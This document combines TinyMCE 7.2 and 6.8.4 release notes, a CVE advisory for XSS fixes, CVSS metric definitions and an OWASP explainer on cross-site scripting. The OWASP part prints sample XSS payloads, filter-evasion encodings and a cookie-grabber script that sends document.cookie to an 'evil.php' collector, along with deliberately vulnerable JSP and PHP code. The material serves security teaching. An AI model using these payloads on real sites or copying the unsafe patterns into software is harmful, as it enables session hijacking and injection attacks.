| --- | --- |

## Overview

TinyMCE 7.2 was released for TinyMCE Enterprise and Tiny Cloud on Wednesday, June 19th, 2024. These release notes provide an overview of the changes for TinyMCE 7.2, including:

* [Accompanying Premium self-hosted server-side component changes](#accompanying-premium-self-hosted-server-side-component-changes)
* [Accompanying Premium plugin changes](#accompanying-premium-plugin-changes)
* [Improvements](#improvements)
* [Additions](#additions)
* [Changes](#changes)
* [Bug fixes](#bug-fixes)
* [Security fixes](#security-fixes)

## Accompanying Premium self-hosted server-side component changes

The TinyMCE 7.2 release includes accompanying changes affecting the TinyMCE **self-hosted** services for the following plugin:

* **Spell Checker** plugin `tinymcespellchecker`.

For information on:

* The **Spell Checker** plugin, see: [Spell Checker plugin](../introduction-to-tiny-spellchecker/).
* Deploying the **server-side** components, see: [Server-side component installation](../introduction-to-premium-selfhosted-services/).

The Java server-side component has been updated to the following version:

* `ephox-spelling.war`: 2.119.6

### Updating the self-hosted server-side components

The new versions of the server-side services provide updates for the Java-based server-side components. To deploy the updated version of the server-side components:

1. Update your Java Application Server to the minimum required version:

   * Eclipse Jetty:

     + 9.4+
   * WebSphere Application Server (WAS) 8 or later
   * Apache Tomcat:

     + 10 (See note below)
     + 9+
     + 8.5.12+
     + 8.0.42+
     + 7.0.76+

     |  | Tomcat 10 will require WAR files to be placed in the *webapp-javaee* directory rather than the *webapps* directory due to the change to Jakarta servlets. Jetty 11 is not currently supported due to this change. |
     | --- | --- |
2. Replace the existing server-side `.war` files with the `.war` files bundled with TinyMCE 7.2 or later.

For information on:

* Deploying the server-side components, see: [Server-side component installation](../introduction-to-premium-selfhosted-services/).
* Deploying the server-side components using Docker, see: [Containerized service deployments](../bundle-intro-setup/).

|  | There are no functionality changes in these updated server-side components. |
| --- | --- |

## Accompanying Premium plugin changes

The following premium plugin updates were released alongside TinyMCE 7.2.

### Accessibility Checker

The TinyMCE 7.2 release includes an accompanying release of the **Accessibility Checker** premium plugin.

**Accessibility Checker** includes the following fix.

#### Temporary elements such as incorrect spelling highlights were interfering with accessibility checking.

Previously, elements with certain attributes, such as highlights from the [Spell Checker](../introduction-to-tiny-spellchecker/) plugin, were not being ignored by some checks in the Accessibility Checker plugin.

As a consequence, these checks were not functioning correctly and were missing accessibility failures that should have been detected by the Accessibility Checker plugin.

TinyMCE 7.2 addresses this issue. Now, the checks have been modified to ignore all elements that should be excluded, such as those with specific attributes added by the Spell Checker plugin.

As a result, the Accessibility Checker now accurately identifies the accessibility issues in the content, even when temporary elements are present.

For information on the **Accessibility Checker** premium plugin, see: [Accessibility Checker](../a11ychecker/).

### Image Editing

The TinyMCE 7.2 release includes an accompanying release of the **Image Editing** premium plugin.

**Image Editing** includes the following improvement.

#### Dialog slider components now emit an onChange event when using arrow keys.

Previously in the Edit Image dialog, when using the left/right arrow keys to adjust settings with sliders, the slider component did not properly update the image preview. As a consequence, users were unable to use the keyboard to update image properties controlled by sliders such as Brightness, Contrast, Color Levels, and Gamma settings.

In TinyMCE 7.2, this issue has been resolved. Now, the slider component emits an `onChange` event when the slider value is adjusted using the left/right arrow keys. As a result, users can now update the Edit Image dialog sliders using the keyboard.

For information on the **Image Editing** premium plugin, see: [Image Editing](../editimage/).

### Math

The TinyMCE 7.2 release includes an accompanying release of the **Math** premium plugin.

**Math** includes the following fix.

#### Math preview was not rendered with the colors from the current skin.

Previously, the **Math** preview did not follow the editor skin UI colors. As a consequence, the equation preview dialog was always rendered with black text on white background even if the UI skin was a dark skin.

This has been addressed in TinyMCE 7.2. Now, the editor renders the equation preview inline with the **Math** dialog, and not using an iframe, so that the preview container’s colors are inherited from the dialog. As a result, the text color and background color of the equation preview container now follows the editor skin UI colors.

For information on the **Math** premium plugin, see: [Math](../math/).

### PowerPaste

The TinyMCE 7.2 release includes an accompanying release of the **PowerPaste** premium plugin.

**PowerPaste** includes the following addition.

#### New option to disable the auto-linking feature in PowerPaste.

Previously in TinyMCE, it was not possible to configure PowerPaste to exclude converting text that resembles a URL into a hyperlink. As a consequence, all text that resembled a URL was automatically converted into a hyperlink when pasting plain text or rich text from HTML.

In TinyMCE 7.2, the `powerpaste_autolink_urls` option has been introduced. This option allows users to customize the auto-linking behavior on paste. As a result, users can now disable the auto-linking feature in PowerPaste.

|  | This option is enabled by default and does not exhibit any change in behavior when upgrading to TinyMCE 7.2. |
| --- | --- |

For more information on the `powerpaste_autolink_urls` option, refer to: [PowerPaste - powerpaste\_autolink\_urls](../powerpaste-options/#powerpaste_autolink_urls).

For information on the **PowerPaste** premium plugin, see: [PowerPaste](../introduction-to-powerpaste/).

### Revision History

The TinyMCE 7.2 release includes an accompanying release of the **Revision History** premium plugin.

**Revision History** includes the following addition.

#### New `revisionhistory_fetch_revision` option to support updating a revision.

In TinyMCE 7.2, a new `revisionhistory_fetch_revision` option has been added to enable updating a revision after the initial fetch. If configured, when a revision is selected, the plugin uses this option to update the selected or closest revision that has no content.

|  | As part of this addition, the `content` property is now optional. For the fetched revisions, an empty string is considered as valid content. |
| --- | --- |

|  | The `revisionhistory_fetch` option must be configured when using the new `revisionhistory_fetch_revision` option, as it is required to provide the initial revisions. |
| --- | --- |

For more information on the `revisionhistory_fetch_revision` option, see: [Revision History - revisionhistory\_fetch\_revision](../revisionhistory/#revisionhistory_fetch_revision).

This option is useful for handling revisions with large content or for loading content only when needed.

For information on the **Revision History** premium plugin, see: [Revision History](../revisionhistory/).

### Spell Checker

The TinyMCE 7.2 includes an accompanying release of the **Spell Checker** premium plugin.

**Spell Checker** includes the following improvement.

#### Enhanced spelling service to support spellchecking for additional languages using customer-provided Hunspell dictionaries.

TinyMCE 7.2 introduces the following improvements for specified languages:

* Medical English (US) was updated from `"en_US-medical"` to include `"en-medical"` as an additional code.
* Dutch was updated from `"nl"` to `"nl, nl_NL"`.
* German was updated from `"de"` to `"de, de_DE"`.
* Italian was updated from `"it"` to `"it, it_IT"`.
* Norwegian BokmÃ¥l was updated from `"nb"` to `"nb, nb_NO"`.
* Portuguese (Brazil) was updated from `"pt"` to `"pt, pt_BR"`.
* Swedish was updated from `"sv"` to `"sv, sv_SE"`.

For information on the **Spell Checker** premium plugin, see: [Spell Checker plugin](../introduction-to-tiny-spellchecker/) or for an complete list of supported languages, see: [Supported languages](../introduction-to-tiny-spellchecker/#supported-languages).

## Improvements

TinyMCE 7.2 also includes the following improvements:

### Accessibility for element path buttons, added tooltip to describe the button and removed incorrect `aria-level` attribute.

In previous versions of TinyMCE, Axe-DevTools (web accessibility testing extension) identified that the element path buttons contained an invalid `aria-level` attribute that is not permitted on `role="button"` elements. As a consequence, screen readers were unable to describe the purpose of these buttons to visually impaired users.

TinyMCE 7.2 addresses this issue by adding tooltips to the buttons in the element path which now provides a description of the button’s functionality. In addition, the `aria-describedby` attribute has been added when the tooltip is focused, allowing screen readers to announce and describe the purpose of the button when in-focus. Now, a tooltip appears when hovering over an element path button with the mouse or focusing on it using the keyboard.

|  | With this change TinyMCE also removed of the incorrect `aria-level` attribute that was added to these buttons previously. This change ensures that the editor complies with the "Elements must only use supported ARIA attributes" rule. |
| --- | --- |

### Improve merging of inserted inline elements by removing nodes with redundant inheritable styles.

In previous versions of TinyMCE, when inserting inline elements into existing inline elements, the editor would attempt to merge the contents of identical inline elements. Inserted inline elements would only be removed if they were identical to inline parents of the element being inserted into, and this check would only occur until it found a non-inheritable style or a conflict.

In TinyMCE 7.2, this behavior has been improved. Now, inserted inline elements are removed when they contain no non-inheritable styles, have only one child element, and either:

* Contain no styles which are inherited in a child element, or
* Are identical to any inline parent of the selected element and don’t contain any styles which conflict with another inserted parent’s styles.

As a result, many redundant inline elements are automatically stripped when inserted into the editor, while maintaining their appearance and overall element structure.

### Improved Search & Replace dialog accessibility by changing placeholders to labels.

In previous versions of TinyMCE, the Search & Replace dialog inputs were initially implemented with placeholders.

As a consequence, the dialog was less accessible because the input placeholders were hidden once the user started typing. This posed difficulties for users who rely on consistent visual cues for context.

TinyMCE 7.2 addresses this issue. Now, placeholders have been replaced by input labels located above the input fields.

As a result, the Search & Replace dialog is now more accessible and there are input labels that remain visible at all times.

## Additions

TinyMCE 7.2 also includes the following additions:

### Added `options.debug` API that logs the initial raw editor options to console.

This release introduces a new `options.debug` API that logs the initial raw editor options passed to `tinymce.init` to the console. This API is useful for debugging and troubleshooting issues with the editor, especially when dynamically composing many editor options from different sources.

Usage:

```
tinymce.activeEditor.options.debug();
```

The following data types are logged exactly as they are passed to `tinymce.init`:

* `string`
* `number`
* `boolean`
* `object`
* `array`
* `null`

All other data types not mentioned above are logged as `[object X]` where "X" is the type of the object, such as:

* `Function`
* `Undefined`
* `RegExp`
* `Promise`
* and more

#### Example: using the `options.debug` API:

```
tinymce.init({
  selector: 'textarea',
  height: 500,
  paste_as_text: true,
  context_menu: [ 'image', 'lists' ],
  menu: { insert: { title: 'Insert', items: 'table | image | accordion' }},
  inline: null,
  myUndefined: undefined,
  init_instance_callback: (editor) => editor.options.debug(),
});
```

The above code will log the following to the console:

```
{
  selector: 'textarea',
  height: 500,
  paste_as_text: true,
  context_menu: [ 'image', 'lists' ],
  menu: { insert: { title: 'Insert', items: 'table | image | accordion' }},
  inline: null,
  myUndefined: [object Undefined],
  init_instance_callback: [object Function],
}
```

### Added `referrerpolicy` as a valid attribute for an iframe element.

Previously in TinyMCE, the `referrerpolicy` attribute was not considered as valid for iframe elements. In TinyMCE 7.2, this attribute has been added to the schema, allowing users to include the `referrerpolicy` attribute in iframes.

### Added support for querying the state of the `mceTogglePlainTextPaste` command.

In TinyMCE 7.2, the `mceTogglePlainTextPaste` command has been updated to support querying its state. This allows users to determine whether the paste-as-text mode is currently active.

The `mceTogglePlainTextPaste` command can be queried using the following API:

```
tinymce.activeEditor.queryCommandState('mceTogglePlainTextPaste');
```

## Changes

TinyMCE 7.2 also includes the following change:

### Replaced Tiny branding logo with `Build with TinyMCE` text and logo.

Previously, the branding logo in the TinyMCE status bar was set to the Tiny logo.

Now, the branding logo in the TinyMCE status bar is set to `Build with` and the TinyMCE logo.

## Bug fixes

TinyMCE 7.2 also includes the following bug fixes:

### Deleting in a `div` with preceding `br` elements would sometimes throw errors.

Previously, when deleting the last character in a `<div>` element with preceding `<br>` elements, an error *(Uncaught DOMException: Failed to execute 'setStart' on 'Range': There is no child at offset)* was thrown to the console, and the `<div>` element was incorrectly converted to a `<p>` element.

TinyMCE 7.2 addresses this issue. The delete logic has been modified to properly handle this situation. After the fix, the `<div>` element remains a `<div>`, and no error is thrown to the console when deleting the last character.

### `autoresize_bottom_margin` was not reliably applied in some situations.

In TinyMCE 6.4.1, a [fix](https://www.tiny.cloud/docs/tinymce/6/6.4.1-release-notes/#editor-increases-the-height-indefinitely-when-using-autoresize-with-content_css-document) addressed an issue where the editor’s height would increase indefinitely when using the [Autoresize](../autoresize/) plugin with `content_css` set to `document`. This fix inadvertently caused a regression, resulting in the editor occasionally failing to apply bottom padding correctly.

As a result, the `autoresize_bottom_margin` was not consistently applied in certain scenarios.

In TinyMCE 7.2, this issue has been resolved, and the `autoresize_bottom_margin` is now reliably applied.

### Fixed cases where adding a newline around a br, table or img would not move the cursor to a new line.

In previous versions of TinyMCE, an issue affecting cursor positioning was identified when adding new lines around specific HTML elements such as `<br>`, `<table>`, and `<img>` tags.

As a consequence, the cursor failed to move to a new line when adding a newline around these elements, resulting in unexpected behavior while editing content within the editor.

With the release of TinyMCE 7.2, this issue has been addressed. The editor now accurately interprets the presence of spaces or newlines after certain HTML elements. As a result, cursor movement behaves as expected when adding new lines around `<br>`, `<table>`, and `<img>` tags.

### Focusing on `contenteditable="true"` element when using `editable_root: false` and inline mode caused selection to be shifted.

Previously in TinyMCE, there was an issue where focusing on `contenteditable="true"` elements, such as media elements, while using `editable_root: false` and inline mode would cause the selection to be shifted. When saving the media dialog, the focus would first shift to the editor to ensure the changes are inserted into the editor. However, this caused the selection to change, leading to a duplicated element being inserted into the editor.

This issue has been resolved in TinyMCE 7.2. Now, after focusing on the `contenteditable="true"` root, the editor bookmark is restored, ensuring that the selection remains at the correct location when saving the media.

As a result, when focusing on `contenteditable="true"` elements in inline mode with `editable_root: false`, the selection will remain correct after saving the media dialog. This prevents the duplication of elements and ensures that the changes are inserted at the intended location within the editor.

### Corrected the `role` attribute on listbox dialog components to `combobox` when there are no nested menu items.

Previously in TinyMCE, the `role` attribute on listbox dialog components was set to `menu` when there were no nested menu items. This caused confusion for users, as screen readers would announce non-hierarchical listboxes as menu buttons.

In TinyMCE 7.2, this issue has been addressed by setting the `role` attribute to `combobox` when there are no nested menu items.

As a result, screen readers now announce the listbox as a combobox and the menu it opens as a listbox. This improvement ensures that the currently selected value is announced when tabbing to the select box, and the selected items are announced as a listbox.

## Security fixes

TinyMCE 7.2 includes two fixes for the following security issues:

### HTML entities that were double decoded in `noscript` elements caused an XSS vulnerability.

A [cross-site scripting](https://owasp.org/www-community/attacks/xss/) (XSS) vulnerability was discovered in TinyMCE’s content parsing code. This allowed specially crafted `noscript` elements containing malicious code to be executed when that content was loaded into the editor.

This vulnerability has been patched in TinyMCE 7.2, TinyMCE 6.8.4 and TinyMCE 5.11.0 LTS by ensuring that content within `noscript` elements are properly parsed.

GHSA: [GitHub Advisory](https://github.com/tinymce/tinymce/security/advisories/GHSA-w9jx-4g6g-rp7x).

CVE: [CVE-2024-38357](https://www.cve.org/CVERecord?id=CVE-2024-38357).

|  | Tiny Technologies would like to thank [Malav Khatri (devilbugbounty)](https://malavkhatri.com/) and another reporter for discovering this vulnerability. |

### It was possible to inject XSS HTML that was not matching the regexp when using the `noneditable_regexp` option.

A [cross-site scripting](https://owasp.org/www-community/attacks/xss/) (XSS) vulnerability was discovered in TinyMCE’s content extraction code. When using the `noneditable_regexp` option, specially crafted HTML attributes containing malicious code were able to be executed when content was extracted from the editor.

This vulnerability has been patched in TinyMCE 7.2, TinyMCE 6.8.4 and TinyMCE 5.11.0 LTS by ensuring that, when using the `noneditable_regexp` option, any content within an attribute is properly verified to match the configured regular expression before being added.

GHSA: [GitHub Advisory](https://github.com/tinymce/tinymce/security/advisories/GHSA-9hcv-j9pv-qmph).

CVE: [CVE-2024-38356](https://www.cve.org/CVERecord?id=CVE-2024-38356).

# Cross Site Scripting (XSS)

## Overview

Cross-Site Scripting (XSS) attacks are a type of injection, in which
malicious scripts are injected into otherwise benign and trusted
websites. XSS attacks occur when an attacker uses a web application to
send malicious code, generally in the form of a browser side script, to
a different end user. Flaws that allow these attacks to succeed are
quite widespread and occur anywhere a web application uses input from a
user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting
user. The end user’s browser has no way to know that the script should
not be trusted, and will execute the script. Because it thinks the
script came from a trusted source, the malicious script can access any
cookies, session tokens, or other sensitive information retained by the
browser and used with that site. These scripts can even rewrite the
content of the HTML page. For more details on the different types of XSS
flaws, see: [Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting).

## Description

Cross-Site Scripting (XSS) attacks occur when:

1. Data enters a Web application through an untrusted source, most frequently a web request.
2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.

The malicious content sent to the web browser often takes the form of a
segment of JavaScript, but may also include HTML, Flash, or any other
type of code that the browser may execute. The variety of attacks based
on XSS is almost limitless, but they commonly include transmitting
private data, like cookies or other session information, to the
attacker, redirecting the victim to web content controlled by the
attacker, or performing other malicious operations on the user’s machine
under the guise of the vulnerable site.

### Reflected and Stored XSS Attacks

XSS attacks can generally be categorized into two categories: reflected
and stored. There is a third, much less well-known type of XSS attack
called [DOM Based XSS](../DOM_Based_XSS) that is discussed
separately [here](../DOM_Based_XSS).

#### Reflected XSS Attacks

Reflected attacks are those where the injected script is reflected off
the web server, such as in an error message, search result, or any other
response that includes some or all of the input sent to the server as
part of the request. Reflected attacks are delivered to victims via
another route, such as in an e-mail message, or on some other website.
When a user is tricked into clicking on a malicious link, submitting a
specially crafted form, or even just browsing to a malicious site, the
injected code travels to the vulnerable web site, which reflects the
attack back to the user’s browser. The browser then executes the code
because it came from a “trusted” server. Reflected XSS is also sometimes
referred to as Non-Persistent or Type-I XSS (the attack is carried out
through a single request / response cycle).

#### Stored XSS Attacks

Stored attacks are those where the injected script is permanently stored
on the target servers, such as in a database, in a message forum,
visitor log, comment field, etc. The victim then retrieves the malicious
script from the server when it requests the stored information. Stored
XSS is also sometimes referred to as Persistent or Type-II XSS.

#### Blind Cross-site Scripting

Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker’s payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker’s submitted form via the backend application, the attacker’s payload will get executed.
Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.

### Other Types of XSS Vulnerabilities

In addition to Stored and Reflected XSS, another type of XSS, [DOM Based
XSS](../DOM_Based_XSS) was identified by [Amit Klein
in 2005](http://www.webappsec.org/projects/articles/071105.shtml). OWASP
recommends the XSS categorization as described in the OWASP Article:
[Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting), which covers all
these XSS terms, organizing them into a matrix of Stored vs. Reflected
XSS and Server vs. Client XSS, where DOM Based XSS is a subset of Client
XSS.

#### XSS Attack Consequences

The consequence of an XSS attack is the same regardless of whether it is
stored or reflected ([or DOM Based](../DOM_Based_XSS)). The
difference is in how the payload arrives at the server. Do not be fooled
into thinking that a “read-only” or “brochureware” site is not
vulnerable to serious reflected XSS attacks. XSS can cause a variety of
problems for the end user that range in severity from an annoyance to
complete account compromise. The most severe XSS attacks involve
disclosure of the user’s session cookie, allowing an attacker to hijack
the user’s session and take over the account. Other damaging attacks
include the disclosure of end user files, installation of Trojan horse
programs, redirecting the user to some other page or site, or modifying
presentation of content. An XSS vulnerability allowing an attacker to
modify a press release or news item could affect a company’s stock price
or lessen consumer confidence. An XSS vulnerability on a pharmaceutical
site could allow an attacker to modify dosage information resulting in
an overdose. For more information on these types of attacks see
[Content\_Spoofing](../Content_Spoofing).

### How to Determine If You Are Vulnerable

XSS flaws can be difficult to identify and remove from a web
application. The best way to find flaws is to perform a security review
of the code and search for all places where input from an HTTP request
could possibly make its way into the HTML output. Note that a variety of
different HTML tags can be used to transmit a malicious JavaScript.
Nessus, Nikto, and some other available tools can help scan a website
for these flaws, but can only scratch the surface. If one part of a
website is vulnerable, there is a high likelihood that there are other
problems as well.

### How to Protect Yourself

The primary defenses against XSS are described in the [OWASP XSS Prevention Cheat
Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

Also, it’s crucial that you turn off HTTP TRACE support on all web
servers. An attacker can steal cookie data via Javascript even when
document.cookie is disabled or not supported by the client. This attack
is mounted when a user posts a malicious script to a forum so when
another user clicks the link, an asynchronous HTTP Trace call is
triggered which collects the user’s cookie information from the server,
and then sends it over to another malicious server that collects the
cookie information so the attacker can mount a session hijack attack.
This is easily mitigated by removing support for HTTP TRACE on all web
servers.

The [OWASP ESAPI project](https://www.owasp.org/www-project-enterprise-security-api) has produced a set of
reusable security components in several languages, including validation
and escaping routines to prevent parameter tampering and the injection
of XSS attacks. In addition, the [OWASP WebGoat Project](https://www.owasp.org/www-project-webgoat/) training
application has lessons on Cross-Site Scripting and data encoding.

### Alternate XSS Syntax

#### XSS Using Script in Attributes

XSS attacks may be conducted without using `<script>...</script>`
tags. Other tags will do exactly the same thing, for example:
`<body onload=alert('test1')>` or other attributes like: `onmouseover`, `onerror`.

##### onmouseover

`<b onmouseover=alert('Wufff!')>click me!</b>`

##### onerror

`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`

#### XSS Using Script Via Encoded URI Schemes

If we need to hide against web application filters we may try to encode
string characters, e.g.: `a=&\#X41` (UTF-8) and use it in `IMG` tags:

`<IMG SRC=j&#X41vascript:alert('test2')>`

There are many different UTF-8 encoding notations that give us even more
possibilities.

#### XSS Using Code Encoding

We may encode our script in base64 and place it in `META` tag. This way we
get rid of `alert()` totally. More information about this method can be
found in RFC 2397

```
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">

```

These and others examples can be found at the OWASP [XSS Filter Evasion Cheat Sheet](../../xss-filter-evasion-cheatsheet) which is a true
encyclopedia of the alternate XSS syntax attack.

## Examples

Cross-site scripting attacks may occur anywhere that possibly malicious
users are allowed to post unregulated material to a trusted website for
the consumption of other valid users.

The most common example can be found in bulletin-board websites which
provide web based mailing list-style functionality.

### Example 1

The following JSP code segment reads an employee ID, eid, from an HTTP
request and displays it to the user.

```
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>

```

The code in this example operates correctly if `eid` contains only
standard alphanumeric text. If `eid` has a value that includes
meta-characters or source code, then the code will be executed by the
web browser as it displays the HTTP response.

Initially, this might not appear to be much of a vulnerability. After
all, why would someone enter a URL that causes malicious code to run on
their own computer? The real danger is that an attacker will create the
malicious URL, then use e-mail or social engineering tricks to lure
victims into visiting a link to the URL. When victims click the link,
they unwittingly reflect the malicious content through the vulnerable
web application back to their own computers. This mechanism of
exploiting vulnerable web applications is known as Reflected XSS.

### Example 2

The following JSP code segment queries a database for an employee with a
given ID and prints the corresponding employee’s name.

```
<%...
 Statement stmt = conn.createStatement();
 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
 if (rs != null) {
  rs.next();
  String name = rs.getString("name");
%>

Employee Name: <%= name %>

```

As in Example 1, this code functions correctly when the values of name
are well-behaved, but it does nothing to prevent exploits if they are
not. Again, this code can appear less dangerous because the value of
name is read from a database, whose contents are apparently managed by
the application. However, if the value of name originates from
user-supplied data, then the database can be a conduit for malicious
content. Without proper input validation on all data stored in the
database, an attacker can execute malicious commands in the user’s web
browser. This type of exploit, known as Stored XSS, is particularly
insidious because the indirection caused by the data store makes it more
difficult to identify the threat and increases the possibility that the
attack will affect multiple users. XSS got its start in this form with
websites that offered a “guestbook” to visitors. Attackers would include
JavaScript in their guestbook entries, and all subsequent visitors to
the guestbook page would execute the malicious code.

As the examples demonstrate, XSS vulnerabilities are caused by code that
includes unvalidated data in an HTTP response. There are three vectors
by which an XSS attack can reach a victim:

* As in Example 1, data is read directly from the HTTP request and
  reflected back in the HTTP response. Reflected XSS exploits occur
  when an attacker causes a user to supply dangerous content to a
  vulnerable web application, which is then reflected back to the user
  and executed by the web browser. The most common mechanism for
  delivering malicious content is to include it as a parameter in a
  URL that is posted publicly or e-mailed directly to victims. URLs
  constructed in this manner constitute the core of many phishing
  schemes, whereby an attacker convinces victims to visit a URL that
  refers to a vulnerable site. After the site reflects the attacker’s
  content back to the user, the content is executed and proceeds to
  transfer private information, such as cookies that may include
  session information, from the user’s machine to the attacker or
  perform other nefarious activities.
* As in Example 2, the application stores dangerous data in a database
  or other trusted data store. The dangerous data is subsequently read
  back into the application and included in dynamic content. Stored
  XSS exploits occur when an attacker injects dangerous content into a
  data store that is later read and included in dynamic content. From
  an attacker’s perspective, the optimal place to inject malicious
  content is in an area that is displayed to either many users or
  particularly interesting users. Interesting users typically have
  elevated privileges in the application or interact with sensitive
  data that is valuable to the attacker. If one of these users
  executes malicious content, the attacker may be able to perform
  privileged operations on behalf of the user or gain access to
  sensitive data belonging to the user.
* A source outside the application stores dangerous data in a database
  or other data store, and the dangerous data is subsequently read
  back into the application as trusted data and included in dynamic
  content.

### Attack Examples

**Example 1: Cookie Grabber**

If the application doesn’t validate the input data, the attacker can
easily steal a cookie from an authenticated user. All the attacker has
to do is to place the following code in any posted input(ie: message
boards, private messages, user profiles):

```
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>

```

The above code will pass an escaped content of the cookie (according to
RFC content must be escaped before sending it via HTTP protocol with GET
method) to the evil.php script in “cakemonster” variable. The attacker
then checks the results of their evil.php script (a cookie grabber script
will usually write the cookie to a file) and use it.

### Error Page Example

Let’s assume that we have an error page, which is handling requests for
a non existing pages, a classic 404 error page. We may use the code
below as an example to inform user about what specific page is missing:

```
<html>
<body>
<?php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>

```

Let’s see how it works: `http://testsite.test/file_which_not_exist`
In response we get: `Not found: /file_which_not_exist`

Now we will try to force the error page to include our code: `http://testsite.test/<script>alert("TEST");</script>`
The result is: `Not found: / (but with JavaScript code <script>alert("TEST");</script>)`

We have successfully injected the code, our XSS! What does it mean? For
example, that we may use this flaw to try to steal a user’s session
cookie.

# TinyMCE 6.8.4

|  | These are the Tiny Cloud and TinyMCE Enterprise release notes. For information on the latest community version of TinyMCE, see the [TinyMCE Changelog](../changelog/). |
| --- | --- |

## Overview

TinyMCE 6.8.4 was released for TinyMCE Enterprise and Tiny Cloud on Wednesday, June 19th, 2024. These release notes provide an overview of the changes for TinyMCE 6.8.4, including:

* [Security fixes](#security-fixes)

## Security fixes

TinyMCE 6.8.4 includes two fixes for the following security issues:

### HTML entities that were double decoded in `noscript` elements caused an XSS vulnerability.

A [cross-site scripting](https://owasp.org/www-community/attacks/xss/) (XSS) vulnerability was discovered in TinyMCE’s content parsing code. This allowed specially crafted `noscript` elements containing malicious code to be executed when that content was loaded into the editor.

This vulnerability has been patched in TinyMCE 7.2.0, TinyMCE 6.8.4 and TinyMCE 5.11.0 LTS by ensuring that content within `noscript` elements are properly parsed.

GHSA: [GitHub Advisory](https://github.com/tinymce/tinymce/security/advisories/GHSA-w9jx-4g6g-rp7x).

CVE: [CVE-2024-38357](https://www.cve.org/CVERecord?id=CVE-2024-38357)

|  | Tiny Technologies would like to thank [Malav Khatri (devilbugbounty)](https://malavkhatri.com/) and another reporter for discovering this vulnerability. |
| --- | --- |

### It was possible to inject XSS HTML that was not matching the regexp when using the `noneditable_regexp` option.

A [cross-site scripting](https://owasp.org/www-community/attacks/xss/) (XSS) vulnerability was discovered in TinyMCE’s content extraction code. When using the `noneditable_regexp` option, specially crafted HTML attributes containing malicious code were able to be executed when content was extracted from the editor.

This vulnerability has been patched in TinyMCE 7.2.0, TinyMCE 6.8.4 and TinyMCE 5.11.0 LTS by ensuring that, when using the `noneditable_regexp` option, any content within an attribute is properly verified to match the configured regular expression before being added.

GHSA: [GitHub Advisory](https://github.com/tinymce/tinymce/security/advisories/GHSA-9hcv-j9pv-qmph).

CVE: [CVE-2024-38356](https://www.cve.org/CVERecord?id=CVE-2024-38356).

## Description

### Impact

A [cross-site scripting (XSS)](https://owasp.org/www-community/attacks/xss/) vulnerability was discovered in TinyMCE’s content extraction code. When using the `noneditable_regexp` option, specially crafted HTML attributes containing malicious code were able to be executed when content was extracted from the editor.

### Patches

This vulnerability has been patched in TinyMCE 7.2.0, TinyMCE 6.8.4 and TinyMCE 5.11.0 LTS by ensuring that, when using the `noneditable_regexp` option, any content within an attribute is properly verified to match the configured regular expression before being added.

### Fix

To avoid this vulnerability:

* Upgrade to TinyMCE 7.2.0 or higher.
* Upgrade to TinyMCE 6.8.4 or higher for TinyMCE 6.x.
* Upgrade to TinyMCE 5.11.0 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
